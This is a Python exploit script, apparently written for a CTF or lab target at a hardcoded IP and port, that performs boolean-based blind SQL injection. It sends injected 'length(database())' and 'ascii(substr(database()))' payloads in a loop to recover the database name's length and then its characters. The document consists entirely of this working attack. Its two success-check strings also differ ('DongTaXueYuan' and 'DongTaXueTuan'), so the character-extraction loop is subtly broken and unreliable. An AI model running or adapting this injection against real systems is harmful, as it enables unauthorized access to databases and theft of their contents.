import requests


def exp(url):
    db_len = 0
    for i in range(1, 100):
        payload1 = "' and length(database())={}--+".format(i)
        res1 = requests.get(url + payload1)
        if "DongTaXueYuan" in res1.text:
            db_len = i
            break
    print('数据长度为：{}'.format(db_len))

    db_name = ''
    for j in range(db_len):
        for i in range(40, 130):
            payload2 = "'and ascii(substr(database(), {}, 1)) = {} --+".format(j + 1, i)
            res2 = requests.get(url + payload2)
            if "DongTaXueTuan" in res2.text:
                db_name += chr(i)
                break
        print("数据库名为：{}".format(db_name))

if __name__ == "__main__":
    url = "http://120.25.24.45:30235/?id=1"
    exp(url)